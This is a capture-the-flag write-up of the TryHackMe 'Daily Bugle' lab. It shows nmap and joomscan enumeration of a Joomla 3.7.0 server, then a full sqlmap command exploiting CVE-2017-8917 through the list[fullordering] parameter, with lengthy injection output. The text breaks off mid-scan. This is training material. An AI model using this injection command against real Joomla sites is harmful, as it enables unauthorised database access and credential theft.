---
Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.
---

# Daily Bugle — Writeup

## Overview
### Daily Bugle — Writeup
### Daily Bugle — Writeup
![](https://i.imgur.com/H98yNCQ.png)
### Deploy
![](https://i.imgur.com/4xkRRJC.png)

## Enumeration
```text
┌──(kali㉿kali)-[~/skynet]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.105.102
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 20:50 EDT
Nmap scan report for 10.10.105.102
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/27%OT=22%CT=1%CU=44418%PV=Y%DS=2%DC=T%G=Y%TM=63339A9
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%TS=A)SEQ(SP=101%GC
OS:D=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%II=I%TS=A)
OS:OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505
OS:ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
OS:ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   183.73 ms 10.11.0.1
2   183.95 ms 10.10.105.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.23 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.105.102
```
![](https://www.aldeid.com/w/images/thumb/6/63/CTF-TryHackMe-Daily-Bugle-homepage.png/600px-CTF-TryHackMe-Daily-Bugle-homepage.png)
Access the web server, who robbed the bank?
*spiderman*

## Privilege Escalation
![](https://i.imgur.com/fREnB0x.png)
```text
http://10.10.105.102/administrator/manifests/files/joomla.xml

<version>3.7.0</version>

or

http://10.10.105.102/README.txt

1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master

2- What is Joomla?
	* Joomla! is a Content Management System (CMS) which enables you to build Web sites and powerful online applications.
	* It's a free and Open Source software, distributed under the GNU General Public License version 2 or later.
	* This is a simple and powerful web server application and it requires a server with PHP and either MySQL, PostgreSQL or SQL Server to run.
	You can find full technical requirements here: https://downloads.joomla.org/technical-requirements.

joomscan --url http://10.10.233.69

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.105.102 ...
                                                                                                                  
                                                                                                                  
                                                                                                                  
[+] FireWall Detector                                                                                             
[++] Firewall not detected                                                                                        
                                                                                                                  
[+] Detecting Joomla Version                                                                                      
[++] Joomla 3.7.0                                                                                                 
                                                                                                                  
[+] Core Joomla Vulnerability                                                                                     
[++] Target Joomla core is not vulnerable                                                                         
                                                                                                                  
[+] Checking Directory Listing                                                                                    
[++] directory has directory listing :                                                                            
http://10.10.105.102/administrator/components                                                                     
http://10.10.105.102/administrator/modules                                                                        
http://10.10.105.102/administrator/templates                                                                      
http://10.10.105.102/images/banners                                                                               
                                                                                                                  
                                                                                                                  
[+] Checking apache info/status files                                                                             
[++] Readable info/status files are not found                                                                     
                                                                                                                  
[+] admin finder                                                                                                  
[++] Admin page : http://10.10.105.102/administrator/                                                             
                                                                                                                  
[+] Checking robots.txt existing                                                                                  
[++] robots.txt is found                                                                                          
path : http://10.10.105.102/robots.txt                                                                            
                                                                                                                  
Interesting path found from robots.txt                                                                            
http://10.10.105.102/joomla/administrator/                                                                        
http://10.10.105.102/administrator/                                                                               
http://10.10.105.102/bin/                                                                                         
http://10.10.105.102/cache/                                                                                       
http://10.10.105.102/cli/                                                                                         
http://10.10.105.102/components/                                                                                  
http://10.10.105.102/includes/                                                                                    
http://10.10.105.102/installation/                                                                                
http://10.10.105.102/language/                                                                                    
http://10.10.105.102/layouts/                                                                                     
http://10.10.105.102/libraries/                                                                                   
http://10.10.105.102/logs/                                                                                        
http://10.10.105.102/modules/                                                                                     
http://10.10.105.102/plugins/                                                                                     
http://10.10.105.102/tmp/                                                                                         
                                                                                                                  
                                                                                                                  
[+] Finding common backup files name                                                                              
[++] Backup files are not found                                                                                   
                                                                                                                  
[+] Finding common log files name                                                                                 
[++] error log is not found                                                                                       
                                                                                                                  
[+] Checking sensitive config.php.x file                                                                          
[++] Readable config files are not found                                                                          
                                                                                                                  
                                                                                                                  
Your Report : reports/10.10.105.102/  

We can confirm that this version of Joomla is vulnerable to CVE-2017-8917 with sqlmap: 

https://www.exploit-db.com/exploits/42033

Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
```text
┌──(kali㉿kali)-[~/skynet]
└─$ sqlmap -u "http://10.10.105.102/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
        ___
       __H__                                                                                                      
 ___ ___[(]_____ ___ ___  {1.6.9#stable}                                                                          
|_ -| . ["]     | .'| . |                                                                                         
|___|_  ["]_|_|_|__,|  _|                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:18:31 /2022-09-27/

[21:18:31] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                 
[21:18:32] [INFO] testing connection to the target URL
[21:18:33] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=oi0eka2pf4p...55shinn8n3'). Do you want to use those [Y/n] Y
[21:18:49] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:18:50] [INFO] testing if the target URL content is stable
[21:18:50] [INFO] target URL content is stable
[21:18:50] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[21:18:51] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[21:18:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:18:56] [WARNING] reflective value(s) found and filtering out
[21:19:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[21:19:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[21:20:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:20:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:21:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[21:21:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[21:21:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[21:21:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:21:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[21:21:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[21:21:48] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[21:21:49] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[21:21:49] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[21:22:11] [INFO] testing 'Generic inline queries'
[21:22:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:22:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:22:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[21:22:47] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[21:23:08] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[21:23:33] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[21:23:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[21:24:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[21:24:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[21:25:00] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[21:25:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[21:25:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[21:25:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[21:25:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[21:25:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[21:25:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[21:25:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[21:25:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[21:25:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[21:25:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[21:25:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[21:25:42] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[21:25:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                                             
[21:25:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:26:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:26:30] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
